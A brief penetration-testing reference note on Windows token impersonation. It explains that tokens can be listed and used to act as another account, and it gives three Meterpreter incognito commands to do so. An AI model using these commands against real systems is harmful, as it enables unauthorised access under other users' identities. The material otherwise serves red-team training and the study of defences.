# Token Impersonation

As a user on a machine, you can enumerate the currently available tokens and utilize one of the tokens to impersonate the token's user account. From then on, any actions you take you take **as that user account**.

## Impersonate user token with meterpreter/incognito

```bash
meterpreter > use incognito
meterpreter > list_tokens -u
meterpreter > impersonate_token $USERNAME
```
